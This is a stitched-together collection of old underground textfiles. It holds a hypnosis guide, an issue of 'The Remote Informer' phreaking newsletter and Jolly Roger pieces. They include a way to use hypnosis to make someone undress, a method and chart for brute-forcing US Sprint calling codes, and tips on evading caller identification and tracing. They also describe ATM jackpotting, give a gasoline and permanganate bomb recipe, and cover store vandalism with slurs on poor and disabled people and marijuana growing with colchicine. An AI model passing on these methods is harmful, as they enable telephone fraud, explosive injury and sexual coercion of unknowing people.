AS YOU LOOK AT IT I WILL COUNT FROM 100 DOWN, AS A COUNT, YOUR EYES WILL
BECOME MORE AND MORE RELAXED, GETTING MORE AND MORE TIRED WITH EACH
PASSING MOMENT."
NOW, COUNT DOWN FROM 100, ABOUT EVERY 10 NUMBERS SAY "WHEN I REACH XX YOUR
EYES (OR YOU WILL FIND YOUR EYES) ARE BECOMING MORE AND MORE TIRED."  TELL
THEM THEY MAY CLOSE THEIR EYES WHENEVER THEY FEEL LIKE IT.  IF THE PERSONS
EYES ARE STILL OPEN WHEN YOU GET TO 50 THEN INSTEAD OF SAYING
"YOUR EYES WILL.."
SAY "YOUR EYES ARE...".
WHEN THEIR EYES ARE SHUT SAY THE FOLLOWING. AS YOU LIE (OR SIT) HERE WITH
YOUR EYES COMFORTABLY CLOSE YOU FIND YOURSELF RELAXING MORE AND
MORE WITH EACH MOMENT AND BREATH.
THE RELAXATION FEELS PLEASANT AND BLISSFUL SO, YOU HAPPILY GIVE WAY TO
THIS WONDERFUL FEELING. IMAGINGE YOURSELF ON A CLOUD, RESTING PEACEFULLY,
WITH A SLIGHT BREEZE CARESSING YOUR BODY.  A TINGLING SENSASION BEGINS
TO WORK ITS WAY, WITHIN AND WITHOUT YOUR TOES, IT SLOWLY MOVES UP YOUR
FEET, MAKING THEM WARM, HEAVY AND RELAXED. THE CLOUD IS SOFT AND SUPPORTS
YOUR BODY WITH ITS SOFT TEXTURE, THE SCENE IS PEACEFUL AND ABSORBING,
THE PEACEFULNESS ABSORBS YOU COMPLETELY... 
THE TINGLING GENTLY AND SLOWLY MOVES UP YOUR LEGS, RELAXING THEM.
MAKING THEM WARM AND HEAVY.  THE RELAXATION FEELS VERY GOOD, IT FEELS SO
GOOD TO RELAX AND LET GO. AS THE TINGLING CONTINUES ITS JOURNEY UP INTO
YOUR SOLAR PLEXUS, YOU FEEL YOUR INNER STOMACH BECOME VERY RELAXED.  NOW,
IT MOVES SLOWLY INTO YOUR CHEST, MAKING YOUR BREATHING RELAXED AS WELL.
THE FEELING BEGINS TO MOVE UP YOUR ARMS TO YOUR SHOULDERS, MAKING YOUR ARMS
HEAVY AND RELAXED AS WELL.  YOU ARE AWARE OF THE TOTAL RELAXATION YOU ARE
NOW EXPERIENCING, AND YOU GIVE WAY TO IT.  IT IS GOOD AND PEACEFUL, THE
TINGLING NOW MOVEVES INTO YOUR FACE AND HEAD, RELAXING YOUR JAWS, NECK, AND
FACIAL MUSCLES, MAKING YOUR CARES AND WORRIES FLOAT AWAY. AWAY INTO THE
BLUE SKY AS YOU REST BLISFUlLY ON THE CLOUD....
IF THEY ARE NOT RESPONSIVE OR YOU THINK THEY (HE OR SHE..) IS GOING TO
SLEEP, THEN ADD IN A "...ALWAYS CONCENTRATING UPON MY VOICE, INGORING ALL
OTHER SOUNDS.  EVEN THOUGH OTHER SOUNDS EXSIST, THEY AID YOU IN YOUR
RELAXATION..." THEY SHOULD SOON LET OUT A SIGH AS IF THEY WERE LETTING GO,
AND THEIR FACE SHOULD HAVE A "WOODENESS" TO IT, BECOMING FEATURLESS... NOW,
SAY THE FOLLOWING "....  YOU NOW FIND YOURSELF IN A HALLWAY, THE HALLWAY IS
PEACEFUL AND NICE. AS I COUNT FROM 10 TO 1 YOU WILL IMAGINE YOURSELF
WALKING FURTHER AND FURTHER DOWN THE HALL. WHEN I REACH ONE YOU WILL FIND
YOURSELF WHERE YOU WANT TO BE, IN ANOTHER, HIGHER STATE OF CONCIOUS AND
MIND. (COUNT FROM TEN TO ONE)....." DO THIS ABOUT THREE OR FOUR TIMES.
THEN, TO TEST IF THE SUBJECT IS UNDER HYPNOSIS OR NOT, SAY....
"...YOU FEEL A STRANGE SENSATION IN YOUR (ARM THEY WRITE WITH) ARM, THE
FEELING BEGINS AT YOUR FINGERS AND SLOWLY MOVES UP YOUR ARM, AS IT MOVES
THROUGH YOUR ARM YOUR ARM BECOMES LIGHTER AND LIGHTER, IT WILL SOON BE SO
LIGHT IT WILL .....  BECOMING LIGHTER AND LIGHTER WHICH EACH BREATH AND
MOMENT..."
THEIR FINGERS SHOULD BEGIN TO TWITCH AND THEN MOVE UP, THE ARM FOLLOWING,
NOW MY FRIEND, YOU HAVE HIM/HEP IN HYPNOSIS.  THE FIRST TIME YOU DO THIS,
WHILE HE/SHE IS UNDER SAY GOOD THINGS, LIKE:  "YOUR GOING TO FEEL GREAT
TOMORROW" OR "EVERY DAY IN EVERY WAY YOU WILL FIND YOURSELF BECOMING BETTER
AND BETTER".. OR SOME CRAP LIKE THAT... THE MORE THEY GO UNDER, THE DEEPER
IN HYPNOSIS THEY WILL GET EACH TIME YOU DO IT.

+----------------------------+
! WHAT TO DO WHEN HYPNOTISED !
+----------------------------+

WHEN YOU HAVE THEM UNDER YOU MUST WORD THINGS VERY CAREFULLY TO GET YOUR
WAY. YOU CANNOT SIMPLY SAY...  TAKE OFF YOUR CLOTHES AND FUCK THE PILLOW.
NO, THAT WOULD NOT REALLY DO THE TRICK. YOU MUST SAY SOMETHING LIKE....
"YOU FIND YOUR SELF AT HOME, IN YOUR ROOM AND YOU HAVE TO TAKE A SHOWER
(VIVIDLY DESCRIBE THEIR ROOM AND WHATS HAPPENING), YOU BEGIN TO TAKE OFF
YOUR CLOTHES..."  NOW, IT CANT BE THAT SIMPLE, YOU MUST KNOW THE PERSONS
HOUSE, ROOM, AND SHOWER ROOM. THEN DESCRIBE THINGS VIVIDLY AND TELL THEM
TO ACT IT OUT (THEY HAVE TO BE DEEPLY UNDER TO DO THIS...).  I WOULD JUST
SUGGEST THAT YOU EXPERIMENT A WHILE, AND GET TO KNOW HO; TO DO THINGS.

+-----------+
! WAKING UP !
+-----------+

WAKING UP IS VERY EASY, JUST SAY.. "...AS I COUNT FROM 1 TO 5 YOU WILL
FIND YOURSELF BECOMMING MORE AND MORE AWAKE, MORE AND MORE LIVELY.  WHEN
YOU WAKE UP YOU WILL FIND YOURSELF COMPLETELY ALIVE, AWAKE, AND REFRESHED.
MENTALLY AND PHYSICALLY, REMEMBERING THE PLEASANT SENSATION THAT HYPNOSIS
BRINGS...  WAKING UP FEELING LIKE A NEW BORN BABY, REBORN WITH LIFE AND
VIGOR, FEELING EXCELLENT. REMEMBERING THAT NEXT TIME YOU ENTER HYPNOSIS IT
WILL BECOME AN EVER INCREASING DEEPER AND DEEPER STATE THAN BEFORE.
1- YOU FEEL ENERGY COURSE THROUGHOUT YOUR LIMBS.
2- YOU BEGIN TO BREATHE DEEPLY, STIRRING.
3- BEGINING TO MOVE MORE AND MORE YOUR EYES OPEN, BRINGING YOU UP TO
FULL CONCIOUS.
4- YOU ARE UP,UP, UP AND AWAKENING MORE AND MORE.
5- YOU ARE AWAKE AND FEELING GREAT."

AND THATS IT!  YOU NOW KNOW HOW TO HYPNOTISE YOURSELF AND SOMEONE ELSE.
YOU WILL LEARN MORE AND MORE AS YOU EXPERIMENT.

                   Introduction
--------------------------------------------------------------------------
Welcome to the first issue of 'The Remote Informer'!  This newsletter
is reader supported.  If the readers of this newsletter do not help
support it, then it will end.  We are putting this out to help out the
ones that would like to read it.  If you are one of those who thinks they
know everything, then don't bother reading it.  This newsletter is not
anything like the future issues.  The future issues will contain several
sections, as long as reader input is obtained.  Below is an outline
overview of the sections in the future issues.

I/O Board (Input/Output Board)

The I/O Board is for questions you have, that we might be able to
answer or atleast refer you to someone or something.  We will be honest if
we cannot help you.  We will not make up something, or to the effect, just
to make it look like we answered you.  There will be a section in the I/O
Board for questions we cannot answer, and then the readers will have the
opportunity to answer it.  We will print anything that is reasonable in
the newsletter, even complaints if you feel like you are better than
everyone.

NewsCenter

This section will be for news around the underworld.  It will talk of
busts of people in the underworld and anything else that would be
considered news.  If you find articles in the paper, or something happens
in your local area, type it up, and upload it to one of the boards listed
at the end of the newsletter.  Your handle will be placed in the article.
If you do enter a news article, please state the date and from where you
got it.

Feature Section

The Feature Section will be the largest of the sections as it will be
on the topic that is featured in that issue.  This will be largely reader
input which will be sent in between issues.  At the end of the issue at
hand, it will tell the topic of the next issue, therefore, if you have
something to contribute, then you will have ample time to prepare your
article.

Hardware/Software Review
In this section, we will review the good and bad points of hardware
and software related to the underworld.  It will be an extensive review,
rather than just a small paragraph.

The Tops

This section will be the area where the top underworld BBS's, hacking
programs, modem scanners, etc. will be shown.  This will be reader
selected and will not be altered in anyway.  The topics are listed below.
Underworld BBS's (Hack, Phreak, Card, Anarchy, etc.)
Hacking programs for Hayes compatables
Hacking programs for 1030/Xm301 modems
Modem scanners for Hayes compatables
Modem scanners for 1030/Xm301 modems
Other type illegal programs
You may add topics to the list if enough will support it.

Tid Bits

This will contain tips and helpful information sent in by the users.
If you have any information you wish to contribute, then put it in a text
file and upload it to one of the BBS's listed at the end of the
newsletter.
Please, no long distance codes, mainframe passwords, etc.
We may add other sections as time goes by.  This newsletter will not
be put out on a regular basis.  It will be put out when we have enough
articles and information to put in it.  There may be up to 5 a month, but
there will always be at least one a month.  We would like you, the readers,
to send us anything you feel would be of interest to others, like hacking
hints, methods of hacking long distance companies, companies to card from,
etc.  We will maintain the newsletter as long as the readers support it.
That is the end of the introduction, but take a look at this newsletter,
as it does contain information that may be of value to you.

                      Hacking Sprint: The Easy Way
-------------------------------------------------------------------------
                             By: Tracker

If you hack US Sprint, 950-0777 (by the way it is no longer GTE
Sprint), and you are fustrated at hacking several hours only to find one
or two codes, then follow these tips, and it will increase your results
tremendously.  First, one thing that Mr. Mojo proved is that Sprint will
not store more than one code in every hundred numbers.  (ex: 98765400 to
98765499 may contain only one code).   There may NOT be a code in that
hundred, but there will never be more than one.
Sprint's 9 digit codes are stored from 500000000 through 999999999.
In the beginning of Sprint's 950 port, they only had 8 digit codes.  Then
they started converting to 9 digit codes, storing all 8 digit codes
between 10000000 and 49999999 and all 9 digit codes between 500000000 and
999999999.  Sprint has since cancelled most 8 digit codes, although there
are a few left that have been denoted as test codes.  Occaisionally, I
hear of phreaks saying they have 8 digit codes, but when verifying them,
the codes were invalid.
Now, where do you start?  You have already narrowed the low and high
numbers in half, therefore already increasing your chances of good results
by 50 percent.  The next step is to find a good prefix to hack.  By the
way, a prefix, in hacking terms, is the first digits in a code that can be
any length except the same number of digits the code is.  (ex: 123456789
is a code.  That means 1, 12, 123, 1234, 12345, 123456, 1234567, and
12345678 are prefixes)  The way you find a good prefix to hack is to
manually enter a code prefix.  If when you enter the code prefix and a
valid destination number and you do not hear the ringing of the recording
telling you that the code is invalid until near the end of the number,
then you know the prefix is valid.  Here is a chart to follow when doing
this:
Code      - Destination    Range good codes exist
-------------------------------------------------
123456789 - 6192R           123400000 - 123499999
123456789 - 619267R         123450000 - 123459999
123456789 - 61926702R       123456000 - 123456999
123456789 - 6192670293R     123456700 - 123456799
-------------------------------------------------
( R - Denotes when ring for recording starts)
To prove 
this true, I ran a test using OmniHack 1.3p, written by
Jolly Joe.  In this test I found a prefix where the last 3 digits were all
I had to hack.  I tested each hundred of the 6 digit prefix finding that
all but 4 had the ring start after the fourth digit was dialed in the
destination number.  The other four did not ring until I had finished the
entire code.  I set OmniHack to hack the prefix + 00 until prefix + 99.
(ex: xxxxxxy00 to xxxxxxy99: where y is one of the four numbers that the
ring did not start until the dialing was completed.)  Using this method, I
found four codes in a total of 241 attempts using ascending hacking (AKA:
Sequential).  Below you will see a record of my hack:
Range of hack            Codes found     Tries
----------------------------------------------
xxxxxx300 - xxxxxx399     xxxxxx350        50
xxxxxx500 - xxxxxx599     xxxxxx568        68
xxxxxx600 - xxxxxx699     xxxxxx646        46
xxxxxx800 - xxxxxx899     xxxxxx877        77
----------------------------------------------
Totals                     4 codes        241
As you see, these methods work.  Follow these guidlines and tips and
you should have an increase in production of codes in the future hacking
Sprint.  Also, if you have any hints/tips you think others could benefit
from, then type them up and upload them to one of the boards at the end of
the newsletter.

                         Rumors: Why Spread Them?
--------------------------------------------------------------------------
                              By: Tracker
Do you ever get tired of hearing rumors?  You know, someone gets an
urge to impress others, so they create a rumor that some long distance
company is now using tracing equipment.  Why start rumors?  It only scares
others out of phreaking, and then makes you, the person who started the
rumor, look like Mr. Big.  This article is short, but it should make you
aware of the rumors that people spread for personal gain.  The best thing
to do is to denote them as a rumor starter and then leave it at that.  You
should not rag on them constantly, since if the other users cannot
determine if it is fact or rumor, then they should suffer the
consequences.

                     The New Sprint FON Calling Cards
--------------------------------------------------------------------------
                               By: Tracker
US Sprint has opened up a new long distance network called the Fiber
Optic Network (FON), in which subscribers are given calling cards.  These
calling cards are 14 digits, and though, seem randomly generated, they are
actually encrypted.  The rumors floating around about people getting
caught using the Sprint FON calling cards are fact, not rumors.  The
reason people are getting caught is that they confuse the FON calling
cards with the local 950 port authorization codes.  If you will remember,
you never use AT&T calling cards from you home phone.  It has ANI
capability, which is not tracing, but rather the originating phone number
is placed on the bill as soon as the call is completed.  They know your
phone number when you call the 800 access port, but they do not record it
until your call is completed.  Also, through several of my hacks, I came
up with some interesting information surrounding the new Sprint network.
They are listed below.
800-877-0000
This number is for information on US Sprint's 800 calling card
service.  I have not played around with it, but I believe it is for
trouble or help with the FON calling cards.  I am not sure if it is for
subscribing to the FON network.
800-877-0002 - You hear a short tone, then nothing.
800-877-0003 - US Sprint Alpha Test Channel #1
800-877-(0004-0999)
When you call these numbers, you get a recording saying: "Welcome to
US Sprint's 1 plus service."  When the recording stops, if you hit the
pound key (#) you will get the calling card dial tone.
Other related Sprint numbers
800-521-4949   This is the number that you subscribe to US Sprint with.
You may also subscribe to the FON network on this number.  It will take 4
to 5 weeks for your calling card to arrive.
10777
This is US Sprint's equal access number.  When you dial this number,
you then dial the number you are calling, and it will be billed through US
Sprint, and you will receive their long distance line for that call.  Note
that you will be billed for calls made through equal access.  Do not
mistake it to be a method of phreaking, unless used from a remote
location.
If you are in US Sprint's 1+ service then call 1+700-555-1414, which
will tell you which long distance company you are using.  When you hear:
"Thank you for choosing US Sprint's 1 plus service," hit the pound key
(#), and then you will get the US Sprint dial tone.  This however is just
the same as if you are calling from your home phone if you dial direct, so
you would be billed for calls made through that, but there are ways to use
this to your advantage as in using equal access through a PBX.
==========================================================================
                   Automatic Number Identification (ANI)
--------------------------------------------------------------------------
                             By: Tracker

The true definition for Automatic Number Identification has not been
widely known to many.  Automatic Number Identification, (AKA: ANI), is the
process of the destination number knowing the originating number, which is
where you are calling from.  The method of achieving this is to send the
phone number that you are calling from in coded form ahead of the
destination number. Below is an example of this.
ANI Method
Dial: 267-0293
Sent: ********2670293
* - Denotes the originating number which is coded and sent before the
    number
As you noticed there are 8 digits in the coded number.  This is
because, at least I believe, it is stored in a binary-like form. 
Automatic Number Identification means a limited future in phreaking. ANI
does not threaten phreaking very much yet, but it will in the near future.
A new switching system will soon be installed in most cities that are
covered by ESS, Electronic Switching System, now. 
The system will have ANI capabilities which will be supplied to the
owners of phone lines as anadded extra.  The owner's phone will have
an LED read-out that will show the phone number of the people that
call you.  You will be able to block some numbers, so that people
cannot call you.  This system is in the testing stages currently, but will
soon be installed across most of the country.  As you see, this will
end a large part of phreaking, until we, the phreakers, can come up with
an alternative.  As I have been told by several, usually reliable,
people, this system is called ISS, which I am not sure of the meaning of
this, and is being tested currently in Rhode Island.
800 in-watts lines set up by AT&T support ANI.  The equipment to
decode an ANI coded origination number does not costs as much as you would
expect.  950 ports do not offer ANI capability, no matter what you have
been told.  The 950 ports will only give the city in which they are based,
this usually being the largest in the state, sometimes the capitol.
One last thing that I should tell you is that ANI is not related to
tracing.  Tracing can be done on any number whether local, 950, etc.  One
way around this, especially when dialing Alliance TeleConferencing, is to
dial through several extenders or ports.  ANI will only cover the number
that is calling it, and if you call through a number that does not support
ANI, then your number will never be known.

Jackpotting ATM Machines                courtesy of the Jolly Roger

JACKPOTTING was done rather successfully a while back in (you guessed it)
New York. What the culprits did was:
Sever (actually cross over) the line between the ATM and the
host. insert a microcomputer between the ATM and the host. insert
a fradulent card into the ATM.  (card=cash card, not hardware)
What the ATM did was: send a signal to the host, saying "Hey!  Can I
give this guy money, or is he broke, or is his card invalid?"
What the microcomputer did was: intercept the signal from the host,
discard it, send "there's no one using the ATM" signal.
What the host did was: get the "no one using" signal, send back "okay,
then for God's sake don't spit out any money!" signal to ATM.
What the microcomputer did was:
intercept signal (again), throw it away (again), send "Wow!  That
guy is like TOO rich!  Give him as much money as he wants.  In
fact, he's so loaded, give him ALL the cash we have!  He is
really a valued customer." signal.
What the ATM did:
what else?  Obediently dispense cash till the cows came home (or
very nearly so).
What the crooks got:
well in excess of $120,000 (for one weekend's work), and several
years when they were caught.
This story was used at a CRYPTOGRAPHY conference I attended a while
ago to demonstrate the need for better information security.  The
lines between ATM's & their hosts are usually 'weak' in the sense that
the information transmitted on them is generally not encrypted in any
way.  One of the ways that JACKPOTTING can be defeated is to encrypt
the information passing between the ATM and the host.  As long as the
key cannot be determined from the ciphertext, the transmission (and
hence the transaction) is secure.
A more believable, technically accurate story might concern a person
who uses a computer between the ATM and the host to determine the key
before actually fooling the host.  As everyone knows, people find
cryptanalysis a very exciting and engrossing subject...don't they?
(Hee-Hee)

_____             ______
|   |-<<-|   |-<<-|    |
|ATM|    micro    |Host|
|___|->>-|   |->>-|____|

The B of A ATM's are connected through dedicated lines to a host
computer as the Bishop said. However, for maintenance purposes, there
is at least one separate dial-up line also going to that same host
computer. This guy basically bs'ed his way over the phone till he
found someone stupid enough to give him th number. After finding that,
he had has Apple hack at the code. Simple.
Step 2: He had a friend go to an ATM with any B of A ATM card. He
stayed at home with the Apple connected to the host. When his friend
inserted the card, the host displayed it. The guy with the Apple
modified the status & number of the card directly in the host's
memory. He turned the card into a security card, used for testing
purposes. At that point, the ATM did whatever it's operator told it to
do.
The next day, he went into the bank with the $2000 he received,
talked to the manager and told him every detail of what he'd done. The
manager gave him his business card and told him that he had a job
waiting for him when he got out of school.
Now, B of A has been warned, they might have changed the system. On
the other hand, it'd be awful expensive to do that over the whole
country when only a handful of people have the resources and even less
have the intelligence to duplicate the feat. Who knows?

Take a glass jug, and put 3 to 4 drops of gasoline into it. Then put
the cap on, and swish the gas around so the inner surface of the jug
is coated.  Then add a few drops of potassium permanganate solution
into it and cap it.  To blow it up, either throw it at something, or
roll it at something.

Fun at K-Mart                                   by the Jolly Roger

Well, first off, one must realise the importance of K-Marts in
society today. First off, K-Marts provide things cheaper to those who
can't afford to shop at higher quality stores.  Although, all I ever
see in there is minorities and Senior Citizens, and the poor people in
our city.  Personally, I wouldn't be caught dead in there.  But, once,
I did.
You see, once, after The Moon Roach and Havoc Chaos(Dear friends of
mine) and I were exploring such fun things as rooftops, we came along
a K-Mart.  Amused, and cold for that matter, we wandered in.  The
Tension mounts.
As we walked up to the entrance, we were nearly attacked by Youth
Groups selling cheap cookies, and wheelchair sticken people selling
American Flags.  After laughing at these people, we entered. This is
where the real fun begins...
First, we wandered around the store, and turned on all the blue
lights we could find. That really distracts and confuses the
attendents...Fun to do...
The first neat thing, is to go to the section of the store where
they sell computers. Darkness engulf the earth the day they find Apple
Computers being sold there.  Instead, lesser computers like the
laughable C-64 can be found there...Turn it on, and make sure
nobody's looking...Then, once in Basic, type...

]10 PRINT "Fuck the world!  Anarchy Rules!" (or something to that
                                             effect.)
]20 GOTO 10 and walk away.

Also, set the sample radios in the store to a santanic rock station,
and turn the radio off.  Then, set the alarm for two minutes ahead of
the time displayed there.  Turn the volume up all the way, and walk
away.  After about two minutes, you will see the clerk feebly attempt
to turn the radio down or off.  It's really neat to set ten or more
radios to different stations, and walk away.
One of my favorite things to do, is to get onto the intercom system
of the store.  Easier typed then done.  First, check out the garden
department.  You say there's no attendent there? Good.  Sneak
carefully over to the phone behind the cheap counter there, and pick
it up.  Dial the number corrisponding to the item that says 'PAGE'...
And talk.  You will note that your voice will echo all over the bowels
of K-Mart.
I would suggest announcing something on the lines of: "Anarchy
rules!!"

How to grow Marijuana                       courtesy of the Jolly Roger

                           MARIJUANA
Marijuana is a deciduous plant which grows from seeds. The fibrous section
of the plant was (has been replaced by synthetics) used to make rope.
The flowering tops, leaves, seeds, and resin of the plant is
used by just about everyone to get HIGH.
Normally, the vegetable parts of the plant are smoked to produce this
"high," but thay can also be eaten. The axtive ingredient in marijuana
resin is THC (tetahydrocannabinol). Marijuana contains from 1 - 4 per
cent THC (4 per cent must be considered GOOD dope).
Marijuana grows wild in many parts of the world, and is cultivated in
Mexice, Vietnam, Africa, Nepal, India, South America, etc.,etc. The
marijuana sold in the United States comes primarily from, yes, the
Uniited States.
It is estimated that at least 50 per cent of the grass on the streets
in America is homegrown. The next largest bunch comes actoss the
borders from Mexico, with smaller amounts filtering in from Panama,
occasionally South America, and occasinally, Africa.
Hashish is the pure resin of the marijuana plant, which is scraped from
the flowering tops of the plant and lumped together. Ganja is the
ground-up tops of the finest plants. (It is also the name given to any
sort of marijuana in Jamaica.)
Marijuana will deteriorate in about two years if exposed to light,
air or heat. It should always be stored in cool places.
Grass prices in the United States are a direct reflection of the laws
of supply and demand (and you thought that high school economics
would never be useful). A series of large border busts, a short growing
season, a bad crop, any number of things can drive the price of marijuana
up. Demand still seems to be on the increase in the U.S., so prices seldom
fall below last year's level.
Each year a small seasonal drought occurs, as last year's supply runs
low, and next year's crop is not up yet. Prices usually rase about
20 - 75 per cent during this time and then fall back to "normal."
Unquestionably, a large shortage of grass causes a percentage of smokers
to turn to harder drugs instead. For this reason, no grass control
program can ever be beneficial or "successful."
                                GROW IT!
There is one surefire way of avoiding high prices and the grass DT's:
Grow your own. This is not as difficult as some "authorities" on the
subject would make you believe. Marijuana is a weed, and a fairly
vivacious one at that, and it will grow almost in spite of you.
                               OUTDOORS
Contrary to propular belief, grass grows well in many place on the
North American continent. It will flourish even if the temperature does
not raise above 75 degrees.
The plants do need a minimum of eight hours of sunlight per day and
should be planted in late April/early May, BUT DEFINITELY, after the
last frost of the year.
Growing an outdoor, or "au naturel", crop has been the favored method
over the years, because grass seems to grow better without as much
attention when in its natural habitat.
Of course, an outdoors setting requires special precautions not encoun-
tered with an indoors crop; you must be able to avoid detection, both from
law enforcement freaks and common freaks, both of whom will take your
weed and probably use it. Of course, one will also arrest you. You must
also have access to the area to prepare the soil and harvest the crop.
There are two schools of thought about starting the seeds. One says you
should start the seedlings for about ten days in an indoor starter box
(see the indoor section) and then transplant. The other theory is that
you should just start them in the correct location. Fewer plants will
come up with this method, but there is no shock of transplant to
kill some of the seedlings halfway through.
The soil should be preprepared for the little devils by turning it
over a couple of times and adding about one cup of hydrated lime per
square yard of soil and a little bit (not too much, now) of good water
soluble nitrogen fertilizer. The soil should now be watered several
times and left to sit about one week.
The plants should be planted at least three feet apart, getting too
greedy and stacking them too close will result in stunted plants.
The plants like some water during their growing season, BUT not too
much. This is especially true around the roots, as too much water will
rot the root system.
Grass grows well in corn or hops, and these plants will help provide
some camouflage. It does not grow well with rye, spinach, or pepperweed.
It is probally a good idea to plant in many small, broken patches, as
people tend to notice patterns.
                       GENERAL GROWING INFO
Both the male and he female plant produce THC resin, although the male
is not as strong as the female. In a good crop, the male will still be
plenty smokable and should not be thrown away under any circumstances.
Marijuana can reach a hight of twenty feet (or would you rather wish on
a star) and obtain a diameter of 4 1/2 inches. If normal, it has a sex
ratio of about 1:1, but this can be altered in several ways.
The male plant dies in the 12th week of growing, the female will live
another 3 - 5 weeks to produce her younguns. Females can weigh twice as
much as males when they are mature.
Marijuana soil should compact when you squeeze it, but should also break
apart with a small pressure and absorb water well. A nice test
for either indoor or outdoor growing is to add a bunch of worms to the
soil, if they live and hang aroung, it is good soil, but if they don't,
well, change it. Worms also help keep the soil loose enough for the
plants to grow well.
                                SEEDS
To get good grass, you should start with the right seeds. A nice starting
point is to save the seeds form the best batch you have consumed. The
seeds should be virile, that is, they should not be grey and shiriveled
up, but green, meaty, and healthy appearing. A nice test is to drop the
seeds on a hot frying pan. If they "CRACK," they are probably good for
planting purposes.
The seeds should be soaked in distilled water overnight before planting.
BE SURE to plant in the ground with the pointy end UP. Plant about 1/2"
deep. Healthy seeds will sprout in about five days.
                             SPROUTING
The best all around sprouting method is probably to make a sprouting box
(as sold in nurseries) with a slated bottom or use paper cups with holes
punched in the bottoms. The sprouting soil should be a mixture of humus,
soil, and five sand with a bit of organic fertilizer and water mixed
in about one week before planting.
When ready to transplant, you must be sure and leave a ball of soil
around the roots of each plant. This whole ball is dropped into a
baseball-sized hold in the permanent soil.
If you are growing/transplanting indoors, you should use a green
safe light (purchased at nurseries) during the transplanting operation.
If you are transplanting outdoors, you should time it about two
hours befor sunset to avoid damage to the plant. Always wear cotton
gloves when handling the young plants.
After the plants are set in the hole, you should water them. It is also
a good idea to use a commercial transplant chemical (also purchased at
nurseries) to help then overcome the shock.
                          INDOOR GROWING
Indoor growing has many advantages, besides the apparent fact that it
is much harder to have your crop "found," you can control the ambient
conditions just exactly as you want them and get a guaranteed "good"
plant.
Plants grown indoors will not appear the same as their outdoor cousins.
They will be scrawnier appearing with a weak stems and may even require
you to tie them to a growing post to remain upright, BUT THEY WILL HAVE
AS MUCH OR MORE RESIN!
If growing in a room, you should put tar paper on the floors and then
buy sterilized bags of soil form a nursery. You will need about one
cubic foot of soil for eavh plant.
The plants will need about 150 ml. of water per plant/per week. They
will also need fresh air, so the room must be ventilated. (however,
the fresh air should contain NO TOBACCO smoke.)
At least eight hours of light a day must be provided. As you increase
the light, the plants grow faster and show more females/less males.
Sixteen hours of light per day seems to be the best combination, beyond
this makes little or no appreciable difference in the plant quality.
Another idea is to interrupt the night cycle with about one hour of
light. This gives you more females.
The walls of your growing room should be painted white or covered with
aluminum foil to reflect the light.
The lights themselves can be either bulbs of fluorescent. Figure about
75 watts per plant or one plant per two feet of flouresent tube.
The fluorescents are the best, but do not use "cool white" types. The
light sources should be an average of twenty inches from the
plant and NEVER closer than 14 inches. They may be mounted on a rack
 and moved every few days as the plants grow.
The very best light sources are those made by Sylvania and others
especially for growing plants (such as the "gro lux" types).
                       HARVESTING AND DRYING
The male plants will be taller and have about five green or yellow sepals,
which will split open to fertilize the female plant with pollen.
The female plant is shorter and has a small pistillate flower, which
really doesn't look like a flower at all but rather a small bunch of
leaves in a cluster.   
If you don't want any seeds, just good dope, you should pick the males
before they shed their pollen as the female will use some of her resin
to make the seeds.
After another three to five weeks, after the males are gone, the females
will begin to wither and die (from loneliness?), this is the time to pick.
In some nefarious Middle Eastren countries, farmers reportedly put their
beehives next to fiels of marijuana. The little devils collect the grass
pollen for their honey, which is supposed to contain a fair dosage
of THC.
The honey is then enjoyed by conventional methods or made into ambrosia.
If you want seeds - let the males shed his pollen then pick him. Let
the female go another month and pick her.
To cure the plants, they must be dried. On large crops, this is
accomplished by constructing a drying box or drying room.
You must have a heat source (such as an electric heater) which will make
the box/room each 130 degrees. The box/room must be ventilated
to carry off the water-vapor-laden air and replace it with fresh.
A good box can be constructed from an orange crate with fiberglass
insulated walls, vents in the tops, and screen shelves to hold the leaves.
There must be a baffle between the leaves and the heat source.
A quick cure for smaller amounts is to: cut the plant at the soil level
and wrap it in a cloth so as not to loose any leavs. Take out any seeds
by hand and store. Place all the leaves on a cookie sheet or aluminum
foil and put them in the middle sheld of the oven, which is set on "broil."
In a few seconds, the leaves will smoke and curl up, stir them around and
give another ten seconds before you take them out.
                    TO INCREASE THE GOOD STUFF
There are several tricks to increase the number of females, or the THC
content of plants:
You can make the plants mature in 36 days if you are in a hurry, by cutting
back on the light to about 14 hours, but the plants will not be as big.
You should gradually shorten the light cycle until you reach fourteen
hours.
You can stop any watering as the plants begin to bake the resin rise to
the flowers. This will increse the resin a bit.
You can use a sunlamp on the plants as they begin to develop flower stalks.
You can snip off the flower, right at the spot where it joins the plant,
and a new flower will form in a couple of weeks.
This can be repeated two or three times to get several times more flowers
than usual.
If the plants are sprayed with Ethrel early in their growing stage, they
will produce almost all female plants. This usually speeds up the flowering
also, it may happen in as little as two weeks.
You can employ a growth changer called colchicine. This is a bit hard to
get and expensive. (Should be ordered through a lab of some sort and
costs about $35 a gram.)
To use the colchicine, you should prepare your presoaking solution of
distilled water with about 0.10 per cent colchicine. This will cause
many of the seeds to die and not germinate, but the ones that do come
up will be polyploid plants. This is the accepted difference between
such strains as "gold" and normal grass, and yours will DEFINITELY
be superweed.
The problem here is that colchicine is a posion in larger quanities and
may be poisonous in the first generation of plants. Bill Frake, author
of CONNOISSEUR'S HANDBOOK OF MARIJUANA runs a very complete colchicine
treatment down and warns against smoking the first generation plants
(all succeeding generations will also be polyploid) bacause of this
poisonous quality.
However, the Medical Index shows colchicine being given in very small
quantities to people for treatment if various ailments. Although these
quantities are small, they would appear to be larger than any you could
recive form smoaking a seed-treated plant.
It would be a good idea to buy a copy of CONNOISSEUR'S, if you are planning
to attempt this, and read Mr. Drake's complete instructions.
Another still-experimental process to increase the resin it to pinch off
the leaf tips as soon as they appear from the time the plant is in the
seedling stage on through its entire life-span. This produces a distorted,
wrecked-looking plant which would be very difficuly to recognize as
marijuana. Of course, there is less substance to this plant, but such
wrecked creatures have been known to produve so much resin that it
crystallizes a strong hash all over the surface of the plant - might
be wise to try it on a plant or two and see what happens.
                        PLANT PROBLEM CHART
Always check the overall enviromental conditions prior to passing
judgment - soil aroung 7 pH or slightly less - plenty of water, light,
fresh air, loose soil, no water standing in pools.

                         EXTRA SECTION:
                       BAD WEED/GOOD WEED
Can you turn bad weed into good weed? Surprisingly enough, the answer
to this oft-asked inquiry is, yes!
Like most other things in life, the amount of good you are going
to do relates directly to how much effort you are going to put into it.
There are no instant, supermarket products which you can spray on Kansas
catnip and have wonderweed, but there are a number of simplified,
inexpensive processes (Gee, Mr. Wizard!) thich will enhance mediocre
grass somewhat, ant there are a couple of fairly involved processes
which will do up even almost-parsley weed into something worth writing
home about.
                                   EASES
1. Place the dope in a container which allows air to enter in a restricted
